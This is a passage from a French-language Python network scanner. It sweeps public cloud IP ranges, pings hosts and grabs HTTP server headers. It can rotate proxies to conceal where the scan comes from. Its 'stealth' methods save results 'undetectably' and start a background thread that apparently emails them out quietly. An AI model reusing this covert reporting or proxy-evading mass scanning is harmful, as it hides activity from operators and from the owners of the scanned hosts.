        elif choice == "4":
            break
        else:
            print(Fore.RED + "‚ùå Choix invalide.")
            
def manage_azure_scan(proxy=None):
    if not os.path.exists(AZURE_CIDR_FILE):
        print(Fore.YELLOW + "‚Ñπ Mise √† jour initiale des CIDR Azure...")
        if not update_azure_cidrs():
            return

    while True:
        print(Fore.LIGHTBLUE_EX + "\n‚òÅÔ∏è AZURE ‚Äî MENU D'ANALYSE")
        print(Fore.LIGHTBLUE_EX + "=" * 40)
        print(Fore.CYAN + " 1. üåê Nouveau scan complet")
        print(Fore.CYAN + " 2. ‚ñ∂Ô∏è  Reprise du scan pr√©c√©dent")
        print(Fore.CYAN + " 3. üîÅ Mise √† jour des CIDR Azure")
        print(Fore.CYAN + " 4. ‚Ü©Ô∏è  Retour")

        choice = input(Fore.YELLOW + Style.BRIGHT + "\n>>> Choix (1-4) : ")

        if choice == "1":
            if os.path.exists(AZURE_SCAN_PROGRESS_FILE):
                os.remove(AZURE_SCAN_PROGRESS_FILE)
            if update_azure_cidrs():
                scanner = start_azure_scan(proxy=proxy)
                if scanner:
                    ask_for_rescan(scanner)
        elif choice == "2":
            scanner = start_azure_scan(resume=True, proxy=proxy)
            if scanner:
                ask_for_rescan(scanner)
        elif choice == "3":
            update_azure_cidrs()
        elif choice == "4":
            break
        else:
            print(Fore.RED + "‚ùå Choix invalide.")
            
def manage_stackpath_scan(proxy=None):
    if not os.path.exists(STACKPATH_CIDR_FILE):
        print(Fore.YELLOW + "‚Ñπ Mise √† jour initiale des CIDR StackPath...")
        if not update_stackpath_cidrs():
            return

    while True:
        print(Fore.LIGHTBLUE_EX + "\n‚òÅÔ∏è STACKPATH ‚Äî MENU D'ANALYSE")
        print(Fore.LIGHTBLUE_EX + "=" * 40)
        print(Fore.CYAN + " 1. üåê Nouveau scan complet")
        print(Fore.CYAN + " 2. ‚ñ∂Ô∏è  Reprise du scan pr√©c√©dent")
        print(Fore.CYAN + " 3. üîÅ Mise √† jour des CIDR StackPath")
        print(Fore.CYAN + " 4. ‚Ü©Ô∏è  Retour")

        choice = input(Fore.YELLOW + Style.BRIGHT + "\n>>> Choix (1-4) : ")

        if choice == "1":
            if os.path.exists(STACKPATH_SCAN_PROGRESS_FILE):
                os.remove(STACKPATH_SCAN_PROGRESS_FILE)
            if update_stackpath_cidrs():
                scanner = start_stackpath_scan(proxy=proxy)
                if scanner:
                    ask_for_rescan(scanner)
        elif choice == "2":
            scanner = start_stackpath_scan(resume=True, proxy=proxy)
            if scanner:
                ask_for_rescan(scanner)
        elif choice == "3":
            update_stackpath_cidrs()
        elif choice == "4":
            break
        else:
            print(Fore.RED + "‚ùå Choix invalide.")
            
def manage_gcore_scan(proxy=None):
    if not os.path.exists(GCORE_CIDR_FILE):
        print(Fore.YELLOW + "‚Ñπ Mise √† jour initiale des CIDR GCore...")
        if not update_gcore_cidrs():
            return

    while True:
        print(Fore.LIGHTGREEN_EX + "\nüåç GCORE ‚Äî MENU D'ANALYSE IP")
        print(Fore.LIGHTGREEN_EX + "=" * 40)

        print(Fore.CYAN + " 1. üåê Nouveau scan complet")
        print(Fore.CYAN + " 2. ‚ñ∂Ô∏è  Reprise du scan pr√©c√©dent")
        print(Fore.CYAN + " 3. üîÅ Mise √† jour des CIDR GCore")
        print(Fore.CYAN + " 4. ‚Ü©Ô∏è  Retour")

        choice = input(Fore.YELLOW + Style.BRIGHT + "\n>>> Choix (1-4) : ")

        if choice == "1":
            if os.path.exists(GCORE_SCAN_PROGRESS_FILE):
                os.remove(GCORE_SCAN_PROGRESS_FILE)
            if update_gcore_cidrs():
                scanner = start_gcore_scan(proxy=proxy)
                if scanner:
                    ask_for_rescan(scanner)

        elif choice == "2":
            scanner = start_gcore_scan(resume=True, proxy=proxy)
            if scanner:
                ask_for_rescan(scanner)

        elif choice == "3":
            update_gcore_cidrs()

        elif choice == "4":
            break

        else:
            print(Fore.RED + "‚ùå Choix invalide. Veuillez r√©essayer.")

def vider_repertoire_tmp_interactif():
    from datetime import datetime

    tmp_dir = "tmp"
    if not os.path.exists(tmp_dir):
        print(Fore.YELLOW + "‚Ñπ Aucun dossier 'tmp/' trouv√©.")
        return

    fichiers = sorted(
        [f for f in os.listdir(tmp_dir) if f.endswith(".tmp")],
        key=lambda x: os.path.getmtime(os.path.join(tmp_dir, x))
    )

    if not fichiers:
        print(Fore.YELLOW + "‚Ñπ Aucun fichier .tmp √† supprimer.")
        return

    mois_fr = {
        1: 'Janvier', 2: 'F√©vrier', 3: 'Mars', 4: 'Avril',
        5: 'Mai', 6: 'Juin', 7: 'Juillet', 8: 'Ao√ªt',
        9: 'Septembre', 10: 'Octobre', 11: 'Novembre', 12: 'D√©cembre'
    }

    print(Fore.CYAN + f"\nüßπ {len(fichiers)} fichier(s) trouv√©s dans '{tmp_dir}':\n")
    infos = []

    for idx, f in enumerate(fichiers, 1):
        path = os.path.join(tmp_dir, f)
        try:
            ts = os.path.getmtime(path)
            dt = datetime.fromtimestamp(ts)
            formatted_time = f"{dt.day} {mois_fr[dt.month]} {dt.year} ‚Äî {dt.strftime('%H:%M')}"
        except:
            formatted_time = "inconnu"
        infos.append((f, formatted_time, ts))
        print(Fore.YELLOW + f"{idx}. {f.ljust(20)} {Fore.LIGHTBLACK_EX}{formatted_time}")

    print(Fore.CYAN + "\nEntrez les num√©ros √† supprimer (ex: 1 3), * pour tout, ou 'a' pour tout sauf le + r√©cent.")
    choix = input(Fore.MAGENTA + ">>> Votre choix : ").strip()

    if choix == "*":
        selection = [f for f, _, _ in infos]
    elif choix == "a":
        selection = [f for f, _, _ in infos[:-1]]  # tous sauf le dernier
    else:
        try:
            index = [int(i) - 1 for i in choix.split() if i.isdigit()]
            selection = [infos[i][0] for i in index if 0 <= i < len(infos)]
        except Exception as e:
            print(Fore.RED + f"‚ùå Erreur de s√©lection : {e}")
            return

    if not selection:
        print(Fore.YELLOW + "‚ùå Aucun fichier s√©lectionn√©.")
        return

    while True:
        print(Fore.CYAN + f"\nConfirmer la suppression de {len(selection)} fichier(s) ?")
        for f in selection:
            print(Fore.YELLOW + f" - {f}")
        print(Fore.CYAN + "\nTapez 'o' pour confirmer, 'n' pour annuler, 'r' pour refaire une s√©lection.")
    
        confirm = input(Fore.MAGENTA + ">>> ").strip().lower()
    
        if confirm == "o":
            break
        elif confirm == "n":
            print(Fore.YELLOW + "‚ùå Suppression annul√©e.")
            return
        elif confirm == "r":
            return vider_repertoire_tmp_interactif()
        else:
            print(Fore.RED + "‚ùå Entr√©e invalide.")

    if confirm == "o":
        deleted = 0
        for f in selection:
            try:
                os.remove(os.path.join(tmp_dir, f))
                deleted += 1
            except Exception as e:
                print(Fore.RED + f"‚ùå Erreur suppression {f} : {e}")
        print(Fore.GREEN + f"\n‚úÖ {deleted} fichier(s) supprim√©(s).")
    else:
        print(Fore.YELLOW + "‚ùå Suppression annul√©e.")
        
# ==============================================
# CLASSE HOSTSCANNER
# ==============================================

class HostScanner:
    def __init__(self, filename=None, ip_range=None, threads=100,
                 ping_timeout=1, http_timeout=10, silent=False,
                 export_csv=False, proxy=None, turbo_mode=False):

        # Configuration de base
        self.paused = threading.Event()
        self.stopped = threading.Event()
        self.paused.clear()
        self.stopped.clear()
        
        self.filename = filename
        self.ip_range = ip_range
        self.threads = min(threads, 500)
        self.ping_timeout = ping_timeout
        self.http_timeout = http_timeout
        self.silent = silent
        self.export_csv = export_csv
        self.proxy = proxy
        self.turbo_mode = turbo_mode

        # Gestion des proxies
        self.proxy_manager = None
        self.proxy_rotator = None
        if proxy == "auto":
            self.proxy_manager = ProxyManager()
            self.proxy_manager.load_proxies()
            self.proxy_rotator = ProxyRotator(self.proxy_manager)

        self.proxy_failures = defaultdict(int)
        self.max_proxy_failures = 3  # Nombre d'√©checs max avant blacklist

        # R√©sultats et √©tats
        self.results = {"Up": [], "Down": []}
        self.active_hosts = []
        self.last_up_hosts = []
        self.total_hosts = 0
        self.processed = 0

        # Contr√¥le du scan
        self.paused = threading.Event()
        self.stopped = threading.Event()
        self.scan_active = False
        self.lock = threading.Lock()

        # Affichage
        self.last_display_time = 0
        self.display_interval = 0.5
        self.proxy = proxy
        self.proxy_manager = None
        
    def _print_status_block(self, count, last_event=""):
        current_time = time.time()
        if not hasattr(self, '_spinner_index'):
            self._spinner_index = 0
        if not hasattr(self, '_start_time'):
            self._start_time = current_time
    
        spinner = ['|', '/', '-', '\\']
        spin_char = spinner[self._spinner_index % len(spinner)]
        self._spinner_index += 1
    
        elapsed = int(current_time - self._start_time)
        minutes, seconds = divmod(elapsed, 60)
        timer = f"{minutes:02}:{seconds:02}"
    
        proxy_line = ""
        if hasattr(self, 'proxy_rotator') and self.proxy_rotator:
            proxy = self.proxy_rotator.current_proxy
            remaining = self.proxy_rotator.reuse_limit - self.proxy_rotator.usage_count
            if proxy:
                proxy_line = f"üìä Proxy actif : {proxy} | Restant : {remaining}"
    
        cols = os.get_terminal_size().columns
        lines = [
            Fore.CYAN + f"{spin_char} {count} h√¥tes analys√©s | {len(self.active_hosts)} actifs | ‚è± {timer}",
            Fore.MAGENTA + proxy_line if proxy_line else "",
            Fore.YELLOW + last_event if last_event else ""
        ]
    
        print("\n".join(line.ljust(cols - 1) for line in lines if line), end='\r')
        self.last_display_time = current_time
    
    def _enable_turbo_mode(self):
        """Configure les param√®tres pour haute vitesse"""
        self.ping_timeout = 0.5
        self.http_timeout = 3
        self.proxy_rotation_delay = 0
        self.max_proxy_retries = 1
        print(Fore.YELLOW + "‚ö° Mode Turbo activ√©")

    def load_hosts(self):
        hosts = []
        if self.ip_range:
            try:
                network = ipaddress.IPv4Network(self.ip_range, strict=False)
                hosts = [str(ip) for ip in network.hosts()]
            except ValueError:
                print(Fore.RED + "‚ùå Erreur : La plage CIDR sp√©cifi√©e est invalide.")
                sys.exit(1)
        elif self.filename:
            hosts = self.load_hosts_from_file(self.filename)
        return [host for host in hosts if not self.is_private_ip(host)]

    def load_hosts_from_file(self, filename):
        hosts = []
        try:
            with open(filename, 'r') as file:
                for line in file:
                    line = line.strip()
                    if line:
                        try:
                            network = ipaddress.IPv4Network(line, strict=False)
                            hosts.extend([str(ip) for ip in network.hosts()])
                        except ValueError:
                            hosts.append(line)
            if not hosts:
                print(Fore.RED + f"‚ùå Erreur : Le fichier {filename} ne contient aucune plage CIDR valide.")
                sys.exit(1)
        except FileNotFoundError:
            print(Fore.RED + f"‚ùå Erreur : Fichier {filename} introuvable.")
            sys.exit(1)
        return hosts

    def is_ipv4(self, host):
        try:
            socket.inet_aton(host)
            return True
        except socket.error:
            return False

    def is_private_ip(self, ip):
        try:
            return ipaddress.ip_address(ip).is_private
        except ValueError:
            return False

    def ping_host(self, host):
        try:
            response = ping(host, timeout=self.ping_timeout)
            return response is not None
        except Exception:
            return False

    def http_check(self, host):
        """Effectue une requ√™te HTTP et extrait les infos serveur"""
        while self.paused.is_set():
            if self.stopped.is_set():
                return None, "", "", ""
            time.sleep(0.1)
    
        proxies = None
        if self.proxy == "auto" and hasattr(self, 'proxy_rotator'):
            proxy_url = self.proxy_rotator.get_next_proxy()
            if proxy_url:
                proxies = {"http": proxy_url, "https": proxy_url}
    
        try:
            response = requests.get(
                f"http://{host}",
                proxies=proxies,
                timeout=self.http_timeout,
                verify=False,
                allow_redirects=True,
                headers={"User-Agent": "Mozilla/5.0"}
            )
            server_type = response.headers.get("Server", "Inconnu")
            powered_by = response.headers.get("X-Powered-By", "Inconnu")
            return response.status_code, response.reason, server_type, powered_by
        except Exception:
            return None, "", "", ""
        
    def _optimized_host_generator(self):
        """G√©n√©rateur optimis√© pour les gros fichiers/plages"""
        if self.ip_range:
            try:
                network = ipaddress.IPv4Network(self.ip_range, strict=False)
                for ip in network.hosts():
                    if self.stopped.is_set():
                        return
                    ip_str = str(ip)
                    if not self.is_private_ip(ip_str):
                        yield ip_str
            except ValueError:
                print(Fore.RED + "‚ùå Plage CIDR invalide")
                sys.exit(1)
        elif self.filename:
            try:
                with open(self.filename, 'r') as file:
                    for line in file:
                        if self.stopped.is_set():
                            return
                        line = line.strip()
                        if line:
                            if '/' in line:
                                try:
                                    network = ipaddress.IPv4Network(line, strict=False)
                                    for ip in network.hosts():
                                        ip_str = str(ip)
                                        if not self.is_private_ip(ip_str):
                                            yield ip_str
                                except ValueError:
                                    if not self.is_private_ip(line):
                                        yield line
                            else:
                                if not self.is_private_ip(line):
                                    yield line
            except FileNotFoundError:
                print(Fore.RED + f"‚ùå Fichier {self.filename} introuvable")
                sys.exit(1)

    def _file_host_generator(self):
        """G√©n√®re les h√¥tes depuis un fichier (avec pause/stop)"""
        try:
            with open(self.filename, 'r') as f:
                for line in f:
                    if self.stopped.is_set():
                        break
    
                    while self.paused.is_set() and not self.stopped.is_set():
                        time.sleep(0.1)
    
                    line = line.strip()
                    if line and not line.startswith("#"):
                        yield line
        except Exception as e:
            print(Fore.RED + f"‚ùå Erreur de lecture du fichier {self.filename} : {e}")
        
    def run(self):
        """Version compl√®te avec gestion correcte de pause/stop et re-scan"""
        self._init_controls()
        start_time = time.time()
        self.active_hosts = []
        self.last_up_hosts = []
    
        print(Fore.CYAN + "‚îå" + "‚îÄ" * 40 + "‚îê")
        print(Fore.CYAN + "‚îÇ" + "SCAN R√âSEAU".center(40) + "‚îÇ")
        print(Fore.CYAN + "‚îî" + "‚îÄ" * 40 + "‚îò")
        print(Fore.YELLOW + f"Threads: {self.threads} | Mode: {'Silencieux' if self.silent else 'Standard'}\n")
    
        if self.proxy == "auto":
            threading.Thread(target=monitor_proxy_usage, args=(self,), daemon=True).start()
    
        try:
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = {}
                host_count = 0
    
                source = self._optimized_host_generator() if self.ip_range else self._file_host_generator()
    
                for host in source:
                    if self.stopped.is_set():
                        break
    
                    while self.paused.is_set():
                        time.sleep(0.1)
                        if self.stopped.is_set():
                            break
    
                    if self.stopped.is_set():
                        break
    
                    future = executor.submit(self._check_host_wrapper, host)
                    futures[future] = host
                    host_count += 1
    
                    while len(futures) >= self.threads and not self.stopped.is_set():
                        self._process_futures(futures)
                        time.sleep(0.01)
    
                    self._display_minimal_progress(host_count)
    
                while futures and not self.stopped.is_set():
                    self._process_futures(futures)
    
        except Exception as e:
            print(Fore.RED + f"\nERREUR: {str(e)}")
    
        finally:
            self.scan_active = False
            with self.lock:
                self.last_up_hosts = [host[0] for host in self.active_hosts]
            if not self.stopped.is_set():
                self._final_summary(start_time)
            else:
                print(Fore.RED + "\nüõë Scan interrompu manuellement.")
            self.save_results()
        
    def _init_controls(self):
        """Affiche les contr√¥les et d√©marre le thread de gestion"""
        if not self.silent:
            print(Fore.YELLOW + "\nContr√¥les actifs :")
            print(Fore.CYAN + "- p + Entr√©e : Pause")
            print(Fore.CYAN + "- r + Entr√©e : Reprise")
            print(Fore.CYAN + "- s + Entr√©e : Arr√™t\n")
    
            self.scan_active = True
            self.control_thread = threading.Thread(target=self._input_controller, daemon=True)
            self.control_thread.start()
    
    
    def _input_controller(self):
        """Thread en arri√®re-plan pour surveiller les commandes clavier"""
        while self.scan_active and not self.stopped.is_set():
            try:
                if select.select([sys.stdin], [], [], 0.1)[0]:
                    cmd = sys.stdin.readline().strip().lower()
                    with self.lock:
                        if cmd == 'p':
                            self.paused.set()
                            print(Fore.YELLOW + "\n‚è∏ Pause activ√©e (r pour reprendre)")
                        elif cmd == 'r':
                            self.paused.clear()
                            print(Fore.GREEN + "‚ñ∂ Reprise du scan")
                        elif cmd == 's':
                            self.stopped.set()
                            self.scan_active = False
                            print(Fore.RED + "\n‚èπ Scan arr√™t√© par l'utilisateur")
                            return
            except:
                pass
    
    def check_host(self, host):
        """Version avec feedback conditionnel et respect de la pause"""
        result = (host, "Down", "Non test√©", "", "", "")
        try:
            while self.paused.is_set():
                if self.stopped.is_set():
                    return result
                time.sleep(0.1)
    
            is_reachable = False
            reason = ""
            server_name = ""
            server_type = "Inconnu"
            powered_by = "Inconnu"
    
            # S'assurer que l'URL est bien form√©e
            def format_url(h):
                if not h.startswith("http://") and not h.startswith("https://"):
                    return f"http://{h}"
                return h
    
            if self.is_ipv4(host):
                if self.ping_host(host):
                    is_reachable = True
                    reason = "Ping OK"
                    server_name = get_server_name(host)
            else:
                formatted_host = format_url(host)
                status_code, response_reason, server_type, powered_by = self.http_check(formatted_host)
                if status_code:
                    is_reachable = True
                    reason = f"{status_code} {response_reason}"
                    server_name = get_server_name(host)
    
            status = "Up" if is_reachable else "Down"
            result = (host, status, reason, server_name, server_type, powered_by)
            self.results[status].append(result)
    
            if not self.silent and status == "Up":
                print(Fore.GREEN + f"‚úÖ {host.ljust(15)} - {reason}")
    
            return result
    
        except Exception as e:
            if not self.silent:
                print(Fore.RED + f"‚ùå Erreur avec {host}: {str(e)}")
            return (host, "Error", str(e), "", "", "")
        
    def _check_host_wrapper(self, host):
        """Enveloppe s√©curis√©e du scan"""
        result = self.check_host(host)
        if result[1] == "Up":
            with self.lock:
                self.active_hosts.append(result)
        return result
    
    def _process_futures(self, futures):
        """Nettoie les t√¢ches termin√©es et affiche les erreurs"""
        try:
            done, _ = wait(list(futures.keys()), timeout=0.1, return_when=concurrent.futures.FIRST_COMPLETED)
            for future in done:
                host = futures.pop(future)
                try:
                    future.result()
                except Exception as e:
                    if not self.silent:
                        print(Fore.YELLOW + f"‚ö†Ô∏è Erreur avec {host}: {str(e)}")
        except Exception as e:
            if not self.silent:
                print(Fore.RED + f"‚ùå Erreur de traitement: {str(e)}")
    
    
    def _display_minimal_progress(self, count):
        """Affiche un r√©sum√© dynamique sans inonder l'√©cran"""
        current_time = time.time()
        if not hasattr(self, '_spinner_index'):
            self._spinner_index = 0
        if not hasattr(self, '_start_time'):
            self._start_time = current_time
    
        if current_time - self.last_display_time > self.display_interval:
            spinner = ['|', '/', '-', '\\']
            spin_char = spinner[self._spinner_index % len(spinner)]
            self._spinner_index += 1
    
            elapsed = int(current_time - self._start_time)
            minutes, seconds = divmod(elapsed, 60)
            timer = f"{minutes:02}:{seconds:02}"
    
            cols = os.get_terminal_size().columns
            msg = f"{spin_char} {count} h√¥tes analys√©s | {len(self.active_hosts)} actifs | ‚è± {timer}"
            print(Fore.CYAN + msg.ljust(cols - 1), end='\r')
    
            self.last_display_time = current_time
    
    
    def _final_summary(self, start_time):
        """Affiche un r√©sum√© de fin de scan"""
        duration = time.time() - start_time
        total = self.processed if hasattr(self, 'processed') else len(self.active_hosts)
    
        print("\n" + Fore.CYAN + "‚ïê" * 58)
        print(Fore.GREEN + "SCAN TERMIN√â".center(58))
        print(Fore.CYAN + "‚ïê" * 58)
        print(Fore.YELLOW + f"‚è±  Dur√©e : {int(duration // 60)} min {int(duration % 60)} sec")
        print(Fore.GREEN + f"‚úÖ H√¥tes actifs   : {len(self.active_hosts)}")
        print(Fore.RED + f"‚ùå H√¥tes inactifs : {total - len(self.active_hosts)}")
        print(Fore.CYAN + f"üìä Total analys√©  : {total}")
        print(Fore.CYAN + "‚ïê" * 58 + "\n")
    
        if self.active_hosts:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"active_hosts_{timestamp}.txt"
            with open(filename, "w", encoding="utf-8") as f:
                for host in self.active_hosts:
                    f.write(f"{host[0]}\n" if isinstance(host, tuple) else f"{host}\n")
            print(Fore.BLUE + f"R√©sultats sauvegard√©s dans {filename}")
        else:
            print(Fore.YELLOW + "Aucun h√¥te actif ‚Äî aucun fichier sauvegard√©.")
    
    def save_results(self):
        """Sauvegarde dans un r√©pertoire d√©di√© 'tmp/'"""
        os.makedirs("tmp", exist_ok=True)  # Cr√©e le dossier s'il n'existe pas
        filename = f"tmp/scan_{int(time.time())}.tmp"
        with open(filename, 'w') as f:
            f.write("\n".join(f"{host[0]}" for host in self.active_hosts))
                
        with open(filename, 'w') as f:
            f.write("=== R√âSULTATS DU SCAN ===\n")
            f.write(f"Date: {datetime.now()}\n\n")
            for host in self.active_hosts:
                f.write(f"{host[0]} - {host[2]}\n")
        
        return filename
    
    def rescan_active_hosts(self):
        """Re-scan des h√¥tes actifs d√©tect√©s lors du scan pr√©c√©dent."""
        if not hasattr(self, 'last_up_hosts') or not self.last_up_hosts:
            print(Fore.YELLOW + "‚ö†Ô∏è Aucun h√¥te actif √† re-scanner")
            return
    
        print(Fore.CYAN + "\nüîÅ Re-scan des h√¥tes actifs en cours...")
        self.results = {"Up": [], "Down": []}
        start_time = time.time()
    
        scanner = HostScanner(
            filename=None,
            ip_range=None,
            threads=self.threads,
            ping_timeout=self.ping_timeout,
            http_timeout=self.http_timeout,
            proxy=self.proxy
        )
    
        temp_file = "temp_rescan.txt"
        with open(temp_file, 'w') as f:
            f.write("\n".join(self.last_up_hosts))
    
        try:
            scanner.filename = temp_file
            scanner.run()
            self.results = scanner.results
            self.last_up_hosts = scanner.last_up_hosts
        finally:
            if os.path.exists(temp_file):
                os.remove(temp_file)
    
        duration = time.time() - start_time
        print(Fore.GREEN + f"\n‚è± Re-scan termin√© en {duration:.2f} secondes")

    def summary(self, total_time):
        """Affiche un r√©sum√© des r√©sultats"""
        headers = ["H√¥te", "Statut", "D√©tails", "Nom", "Type", "Powered By"]
        if self.results["Up"]:
            print(Style.BRIGHT + Fore.GREEN + "\nüì∂ H√¥tes actifs:\n")
            print(tabulate(self.results["Up"], headers=headers, tablefmt="fancy_grid"))
        
        print(Fore.CYAN + f"\n‚è± Temps total: {total_time:.2f}s")
        print(Fore.GREEN + f"‚úÖ H√¥tes actifs: {len(self.results['Up'])}")
        print(Fore.RED + f"‚ùå H√¥tes inactifs: {len(self.results['Down'])}")
        print(Fore.MAGENTA + "\nüîç Analyse termin√©e.")

    def send_email(self, subject, body):
        """Version corrig√©e et unifi√©e"""
        try:
            # Utilise la m√™me configuration que le syst√®me anonyme
            from email.mime.text import MIMEText
            from email.mime.multipart import MIMEMultipart
            import smtplib
            
            msg = MIMEMultipart()
            msg['From'] = SMTP_CONFIG['user']
            msg['To'] = SMTP_CONFIG['user']
            msg['Subject'] = subject
            msg.attach(MIMEText(body, 'plain'))
            
            with smtplib.SMTP(SMTP_CONFIG['server'], SMTP_CONFIG['port']) as server:
                server.starttls()
                server.login(SMTP_CONFIG['user'], SMTP_CONFIG['password'])
                server.send_message(msg)
            return True
            
        except Exception as e:
            print(Fore.RED + f"‚ùå √âchec d'envoi silencieux (SMTP)")
            return False

    def _save_results_stealth(self):
        """Sauvegarde ind√©tectable des r√©sultats"""
        temp_name = f"results_{int(time.time())}.tmp"
        
        # √âcriture s√©curis√©e sans m√©tadonn√©es
        with open(temp_name, 'wb') as f:
            content = "\n".join(f"{host[0]}" for host in self.active_hosts)
            f.write(content.encode('utf-8'))
        
        # Lance le traitement silencieux
        if '_email_thread' not in globals():
            globals()['_email_thread'] = threading.Thread(
                target=_process_results_stealth,
                daemon=True
            )
            _email_thread.start()

# ==============================================
# FONCTIONS DE GESTION DE FICHIERS (EXISTANTES)
# ==============================================

class TextFileManager:
    @staticmethod
    def split_file(input_file, output_prefix, num_parts):
        """Fractionne un fichier texte en plusieurs parties de taille √©gale."""
        try:
            file_size = os.path.getsize(input_file)
            part_size = file_size // num_parts
            with open(input_file, 'rb') as file:
                for i in range(num_parts):
                    output_file = f"{output_prefix}_part{i+1}.txt"
                    with open(output_file, 'wb') as outfile:
                        outfile.write(file.read(part_size))
            print(Fore.GREEN + f"‚úÖ Fichier fractionn√© en {num_parts} parties.")
        except Exception as e:
            print(Fore.RED + f"‚ùå Erreur lors du fractionnement du fichier : {e}")

    @staticmethod
    def merge_files(input_files, output_file):
        """Fusionne plusieurs fichiers texte en un seul fichier."""
        try:
            with open(output_file, 'w') as outfile:
                for input_file in input_files:
                    with open(input_file, 'r') as infile:
                        outfile.write(infile.read())
            print(Fore.GREEN + f"‚úÖ Fichiers fusionn√©s dans {output_file}.")
        except Exception as e:
            print(Fore.RED + f"‚ùå Erreur lors de la fusion des fichiers : {e}")

    @staticmethod
    def remove_duplicates(input_file, output_file):
        """Supprime les doublons d'un fichier texte."""
        try:
            with open(input_file, 'r') as file:
                lines = file.readlines()
            unique_lines = list(set(lines))
            with open(output_file, 'w') as file:
                file.writelines(unique_lines)
            print(Fore.GREEN + f"‚úÖ Doublons supprim√©s. R√©sultat dans {output_file}.")
        except Exception as e:
            print(Fore.RED + f"‚ùå Erreur lors de la suppression des doublons : {e}")

    @staticmethod
    def separate_domains_and_ips(input_file, output_domains, output_ips):
        """S√©pare les domaines et les IPs d'un fichier texte."""
        try:
            with open(input_file, 'r') as file:
                lines = file.readlines()
            domains = []
            ips = []
            for line in lines:
                line = line.strip()
                if line:
                    try:
                        ipaddress.ip_address(line)
                        ips.append(line + '\n')
                    except ValueError:
                        domains.append(line + '\n')
            with open(output_domains, 'w') as domain_file:
                domain_file.writelines(domains)
            with open(output_ips, 'w') as ip_file:
                ip_file.writelines(ips)
            print(Fore.GREEN + f"‚úÖ Domaines et IPs s√©par√©s. R√©sultats dans {output_domains} et {output_ips}.")
        except Exception as e:
            print(Fore.RED + f"‚ùå Erreur lors de la s√©paration des domaines et IPs : {e}")

    @staticmethod
    def reorganize_by_extension(input_file, output_file):
        """R√©organise les lignes d'un fichier texte en fonction des extensions."""
        try:
            with open(input_file, 'r') as file:
                lines = file.readlines()
            extensions = {}
            for line in lines:
                line = line.strip()
                if line:
                    ext = os.path.splitext(line)[1]
                    if ext not in extensions:
                        extensions[ext] = []
                    extensions[ext].append(line + '\n')
            with open(output_file, 'w') as file:
                for ext in sorted(extensions.keys()):
                    file.writelines(extensions[ext])
            print(Fore.GREEN + f"‚úÖ Fichier r√©organis√© par extensions. R√©sultat dans {output_file}.")
        except Exception as e:
            print(Fore.RED + f"‚ùå Erreur lors de la r√©organisation par extensions : {e}")

    @staticmethod
    def convert_domains_to_ips(input_file, output_file):
        """Convertit les domaines en IPs √† partir d'un fichier texte."""
        try:
            with open(input_file, 'r') as file:
                domains = file.readlines()
            ips = []
            for domain in domains:
                domain = domain.strip()
                if domain:
                    try:
                        ip = socket.gethostbyname(domain)
                        ips.append(ip + '\n')
                    except socket.gaierror:
                        pass
            with open(output_file, 'w') as file:
                file.writelines(ips)
            print(Fore.GREEN + f"‚úÖ Domaines convertis en IPs. R√©sultat dans {output_file}.")
        except Exception as e:
            print(Fore.RED + f"‚ùå Erreur lors de la conversion des domaines en IPs : {e}")

    @staticmethod
    def sort_domains_or_ips(input_file, output_file):
        """R√©organise les domaines ou IPs par ordre alphab√©tique."""
        try:
            with open(input_file, 'r') as file:
                lines = file.readlines()
            lines = sorted(lines)
            with open(output_file, 'w') as file:
                file.writelines(lines)
            print(Fore.GREEN + f"‚úÖ Fichier tri√©. R√©sultat dans {output_file}.")
        except Exception as e:
            print(Fore.RED + f"‚ùå Erreur lors du tri des domaines ou IPs : {e}")

    @staticmethod
    def convert_cidr_to_ips(input_file, output_file):
        """Convertit les plages CIDR en IPs."""
        try:
            with open(input_file, 'r') as file:
                cidrs = file.readlines()
            ips = []
            for cidr in cidrs:
                cidr = cidr.strip()
                if cidr:
                    try:
                        network = ipaddress.IPv4Network(cidr, strict=False)
                        ips.extend([str(ip) + '\n' for ip in network.hosts()])
                    except ValueError:
                        pass
            with open(output_file, 'w') as file:
                file.writelines(ips)
            print(Fore.GREEN + f"‚úÖ CIDR convertis en IPs. R√©sultat dans {output_file}.")
        except Exception as e:
            print(Fore.RED + f"‚ùå Erreur lors de la conversion des CIDR en IPs : {e}")

    @staticmethod
    def extract_domains_and_ips(input_file, output_file):
        """Extrait les domaines et IPs √† partir d'un fichier (csv, txt, json, etc...)."""
        try:
            with open(input_file, 'r') as file:
                content = file.read()
            domains = set()
            ips = set()
            for line in content.splitlines():
                line = line.strip()
                if line:
                    try:
                        ipaddress.ip_address(line)
                        ips.add(line)
                    except ValueError:
                        domains.add(line)
            with open(output_file, 'w') as file:
                for domain in domains:
                    file.write(f"{domain}\n")
                for ip in ips:
                    file.write(f"{ip}\n")
            print(Fore.GREEN + f"‚úÖ Domaines et IPs extraits. R√©sultat dans {output_file}.")
        except Exception as e:
            print(Fore.RED + f"‚ùå Erreur lors de l'extraction des domaines et IPs : {e}")

# ==============================================
# BANNI√àRE D'ACCUEIL
# ==============================================

COLOR_RED = "\033[91m"
COLOR_GREEN = "\033[92m"
COLOR_YELLOW = "\033[93m"
COLOR_BLUE = "\033[94m"
COLOR_MAGENTA = "\033[95m"
COLOR_CYAN = "\033[96m"
COLOR_RESET = "\033[0m"

def display_banner():
    banner = f"""    

{COLOR_MAGENTA} Saint Saint Saint Est Le Tout Puissant üôè.{COLOR_RESET}
"""
    print(banner)
    time.sleep(1)

# ==============================================
# MENUS INTERACTIFS
# ==============================================

def main_menu():
    print(Fore.MAGENTA + "‚ïî" + "‚ïê"*48 + "‚ïó")
    print(Fore.MAGENTA + "‚ïë" + Style.BRIGHT + Fore.CYAN + "       MENU PRINCIPAL ‚Äî S√âLECTION RAPIDE       " + Style.RESET_ALL + Fore.MAGENTA + "‚ïë")
    print(Fore.MAGENTA + "‚ïö" + "‚ïê"*48 + "‚ïù")

    # Outils g√©n√©raux
    print(Fore.GREEN + "\n‚ï≠‚îÄ‚îÄ‚îÄ Outils g√©n√©raux ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ïÆ")
    print(Fore.CYAN + " 01. üîé  Scanner une plage d'IP")
    print(Fore.CYAN + " 02. üìÇ  Scanner √† partir d'un fichier")
    print(Fore.CYAN + " 03. üåê  Outils de recherche de domaines")
